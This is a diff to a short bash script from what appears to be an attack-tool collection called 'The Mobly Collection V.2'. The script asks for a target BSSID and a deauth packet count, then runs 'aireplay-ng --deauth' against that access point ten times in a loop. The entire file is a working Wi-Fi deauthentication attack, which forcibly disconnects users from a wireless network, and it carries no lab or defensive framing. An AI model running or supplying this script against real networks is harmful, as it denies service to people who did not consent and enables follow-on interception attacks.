@@ -11,12 +11,11 @@ $$$$$$$  |\$$$$$$$\        \$$$$$$$ |\$$$$$$  |  \$$$$  |$$ |  $$ |
 \_______/  \_______|        \_______| \______/    \____/ \__|  \__|
                          The Mobly Collection V.2                                          
                                                                    '
-                                                                   
-                                                                              
+                                                                                                                                        
 echo "Enter BSSID" 
-
 read ssid
-clear
-for i in {1..10}; do sudo aireplay-ng --deauth 2 -a $ssid wlan0 ; date ; sleep 5 ; done
+echo "Deauth packets (suggest 5 to avoid disconnections)"
+read packet
 
-else end 
+clear
+for i in {1..10}; do sudo aireplay-ng --deauth $packet -a $ssid wlan0 ; date ; sleep 5 ; done
